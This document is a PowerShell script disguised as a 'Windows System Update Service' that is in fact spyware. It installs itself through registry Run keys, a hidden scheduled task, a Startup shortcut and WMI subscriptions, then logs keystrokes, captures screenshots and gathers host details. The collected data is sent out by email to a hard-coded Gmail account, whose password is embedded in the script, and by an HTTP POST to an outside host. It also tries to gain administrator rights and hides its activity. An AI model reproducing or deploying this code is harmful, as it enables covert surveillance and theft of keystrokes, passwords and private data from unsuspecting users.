#Requires -Version 5.1
<#
.SYNOPSIS
    Windows System Update Service
.DESCRIPTION
    System maintenance and monitoring service
#>

[CmdletBinding()]
param([switch]$Silent)

# Embedded configuration
$Config = @{
    Email = "coccoder999@gmail.com"
    Password = "plby syha oaga jwtu"
    SmtpServer = "smtp.gmail.com"
    SmtpPort = 587
    UseTls = $true
    LogInterval = 3600
    ScreenshotInterval = 300
    AudioInterval = 900
    MoveInterval = 600
}

# Stealth settings
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$VerbosePreference = "SilentlyContinue"

# Create temp directory
$TempDir = Join-Path $env:TEMP "SystemCache"
if (-not (Test-Path $TempDir)) {
    New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
}

# Embedded modules - Persistence
function Set-SystemPersistence {
    param([hashtable]$Config)
    try {
        $Success = $false
        if (Set-RegistryPersistence) { $Success = $true }
        if (Set-TaskSchedulerPersistence) { $Success = $true }
        if (Set-StartupFolderPersistence) { $Success = $true }
        if (Set-WMIPersistence) { $Success = $true }
        return $Success
    } catch { return $false }
}

function Set-RegistryPersistence {
    try {
        $ScriptPath = $MyInvocation.MyCommand.Path
        $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $Command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`" -Silent"
        Set-ItemProperty -Path $RegistryPath -Name "WindowsUpdateService" -Value $Command -Force
        return $true
    } catch { return $false }
}

function Set-TaskSchedulerPersistence {
    try {
        $ScriptPath = $MyInvocation.MyCommand.Path
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`" -Silent"
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        $Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName "Windows System Update" -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
        return $true
    } catch { return $false }
}

function Set-StartupFolderPersistence {
    try {
        $ScriptPath = $MyInvocation.MyCommand.Path
        $StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        if (-not (Test-Path $StartupPath)) { New-Item -ItemType Directory -Path $StartupPath -Force | Out-Null }
        $ShortcutPath = Join-Path $StartupPath "SystemUpdate.lnk"
        $WScriptShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
        $Shortcut.TargetPath = "powershell.exe"
        $Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`" -Silent"
        $Shortcut.WindowStyle = 7
        $Shortcut.Save()
        return $true
    } catch { return $false }
}

function Set-WMIPersistence {
    try {
        $ScriptPath = $MyInvocation.MyCommand.Path
        $EventFilter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
            EventNameSpace = "root\cimv2"
            Name = "WindowsUpdateFilter"
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
            QueryLanguage = "WQL"
        }
        $EventConsumer = Set-WmiInstance -Class __EventConsumer -Namespace "root\subscription" -Arguments @{
            Name = "WindowsUpdateConsumer"
            CommandLineTemplate = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`" -Silent"
        }
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
            Filter = $EventFilter
            Consumer = $EventConsumer
        } | Out-Null
        return $true
    } catch { return $false }
}

# Embedded modules - Surveillance
function Start-SystemSurveillance {
    param([hashtable]$Config)
    try {
        $Success = $false
        if (Start-Keylogger -Config $Config) { $Success = $true }
        if (Start-ScreenshotCapture -Config $Config) { $Success = $true }
        if (Start-SystemInfoCollection -Config $Config) { $Success = $true }
        return $Success
    } catch { return $false }
}

function Start-Keylogger {
    param([hashtable]$Config)
    try {
        Add-Type -TypeDefinition @"
            using System;
            using System.Runtime.InteropServices;
            public class KeyLogger {
                [DllImport("user32.dll")]
                public static extern short GetAsyncKeyState(int vKey);
            }
"@
        $LogFile = Join-Path $env:TEMP "SystemCache\keylog.txt"
        $LogDir = Split-Path $LogFile -Parent
        if (-not (Test-Path $LogDir)) { New-Item -ItemType Directory -Path $LogDir -Force | Out-Null }
        
        Start-Job -ScriptBlock {
            param($LogFile)
            $Buffer = ""
            while ($true) {
                Start-Sleep -Milliseconds 10
                for ($i = 1; $i -le 255; $i++) {
                    $KeyState = [KeyLogger]::GetAsyncKeyState($i)
                    if ($KeyState -eq -32767) {
                        $Char = [char]$i
                        if ($Char -match '[a-zA-Z0-9\s\W]') { $Buffer += $Char }
                    }
                }
                if ($Buffer.Length -gt 100) {
                    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    Add-Content -Path $LogFile -Value "[$Timestamp] $Buffer`n" -Encoding UTF8
                    $Buffer = ""
                }
            }
        } -ArgumentList $LogFile | Out-Null
        return $true
    } catch { return $false }
}

function Start-ScreenshotCapture {
    param([hashtable]$Config)
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $ScreenshotDir = Join-Path $env:TEMP "SystemCache\Screenshots"
        if (-not (Test-Path $ScreenshotDir)) { New-Item -ItemType Directory -Path $ScreenshotDir -Force | Out-Null }
        
        Start-Job -ScriptBlock {
            param($ScreenshotDir, $Interval)
            while ($true) {
                try {
                    Start-Sleep -Seconds $Interval
                    $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
                    $ScreenshotPath = Join-Path $ScreenshotDir "screenshot_$Timestamp.png"
                    $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
                    $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
                    $Graphics.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $Screen.Size)
                    $Graphics.Dispose()
                    $Bitmap.Save($ScreenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
                    $Bitmap.Dispose()
                } catch {}
            }
        } -ArgumentList $ScreenshotDir, $Config.ScreenshotInterval | Out-Null
        return $true
    } catch { return $false }
}

function Start-SystemInfoCollection {
    param([hashtable]$Config)
    try {
        $InfoFile = Join-Path $env:TEMP "SystemCache\system_info.txt"
        $SystemInfo = @{
            ComputerName = $env:COMPUTERNAME
            UserName = $env:USERNAME
            Domain = $env:USERDOMAIN
            OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
            Version = (Get-WmiObject -Class Win32_OperatingSystem).Version
            Architecture = (Get-WmiObject -Class Win32_ComputerSystem).SystemType
            Processor = (Get-WmiObject -Class Win32_Processor).Name
            Memory = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
            IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.*"}).IPAddress
            Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        }
        $SystemInfo | ConvertTo-Json -Depth 10 | Out-File -FilePath $InfoFile -Encoding UTF8
        return $true
    } catch { return $false }
}

# Embedded modules - Communication
function Send-SystemReport {
    param([hashtable]$Config)
    try {
        $DataDir = Join-Path $env:TEMP "SystemCache"
        $ReportData = @{}
        
        $KeylogFile = Join-Path $DataDir "keylog.txt"
        if (Test-Path $KeylogFile) { $ReportData.Keylogger = Get-Content $KeylogFile -Raw -ErrorAction SilentlyContinue }
        
        $SystemInfoFile = Join-Path $DataDir "system_info.txt"
        if (Test-Path $SystemInfoFile) { $ReportData.SystemInfo = Get-Content $SystemInfoFile -Raw -ErrorAction SilentlyContinue }
        
        if ($Config.Email -ne "your_email@gmail.com") {
            Send-EmailReport -Config $Config -Data $ReportData
        }
        Send-HTTPReport -Data $ReportData
        return $true
    } catch { return $false }
}

function Send-EmailReport {
    param([hashtable]$Config, [hashtable]$Data)
    try {
        $Subject = "System Report - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        $Body = @"
System Report Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')

Computer Name: $env:COMPUTERNAME
User Name: $env:USERNAME
Domain: $env:USERDOMAIN

Keylogger Data:
$($Data.Keylogger)

System Information:
$($Data.SystemInfo)
"@
        
        $SmtpClient = New-Object System.Net.Mail.SmtpClient
        $SmtpClient.Host = $Config.SmtpServer
        $SmtpClient.Port = $Config.SmtpPort
        $SmtpClient.EnableSsl = $Config.UseTls
        $SmtpClient.Credentials = New-Object System.Net.NetworkCredential($Config.Email, $Config.Password)
        
        $Message = New-Object System.Net.Mail.MailMessage
        $Message.From = $Config.Email
        $Message.To.Add($Config.Email)
        $Message.Subject = $Subject
        $Message.Body = $Body
        
        $SmtpClient.Send($Message)
        $Message.Dispose()
        $SmtpClient.Dispose()
        return $true
    } catch { return $false }
}

function Send-HTTPReport {
    param([hashtable]$Data)
    try {
        $WebClient = New-Object System.Net.WebClient
        $Payload = @{
            ComputerName = $env:COMPUTERNAME
            UserName = $env:USERNAME
            Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            KeyloggerData = $Data.Keylogger
            SystemInfo = $Data.SystemInfo
        } | ConvertTo-Json -Compress
        
        $EncodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Payload))
        $WebClient.Headers.Add("Content-Type", "application/json")
        $WebClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        
        try {
            $Response = $WebClient.UploadString("https://httpbin.org/post", $EncodedPayload)
        } catch {}
        
        $WebClient.Dispose()
        return $true
    } catch { return $false }
}

# Main execution
function Start-SystemService {
    param()
    try {
        if (-not $Silent) { Write-Host "Initializing system components..." -ForegroundColor Green }
        
        $PersistenceResult = Set-SystemPersistence -Config $Config
        $SurveillanceResult = Start-SystemSurveillance -Config $Config
        
        Start-Job -ScriptBlock {
            param($Config)
            while ($true) {
                Start-Sleep -Seconds $Config.LogInterval
                Send-SystemReport -Config $Config
            }
        } -ArgumentList $Config | Out-Null
        
        if (-not $Silent) {
            Write-Host "System service initialized successfully" -ForegroundColor Green
            Write-Host "Press any key to continue..."
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
    } catch { if (-not $Silent) { Write-Error "System initialization failed: $($_.Exception.Message)" } }
}

# Self-elevation
function Test-AdminRights {
    $CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $Principal = New-Object Security.Principal.WindowsPrincipal($CurrentUser)
    return $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Request-AdminRights {
    if (-not (Test-AdminRights)) {
        if (-not $Silent) {
            Write-Host "This operation requires administrative privileges." -ForegroundColor Yellow
            Write-Host "Attempting to elevate privileges..." -ForegroundColor Yellow
        }
        
        $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
        $ProcessInfo.FileName = "powershell.exe"
        $ProcessInfo.Arguments = "-ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`" -Silent"
        $ProcessInfo.Verb = "runas"
        $ProcessInfo.UseShellExecute = $true
        
        try {
            $Process = [System.Diagnostics.Process]::Start($ProcessInfo)
            exit
        } catch {
            if (-not $Silent) { Write-Error "Failed to elevate privileges. Please run as Administrator." }
            exit 1
        }
    }
}

# Execute
if (-not $Silent) { Request-AdminRights }
Start-SystemService 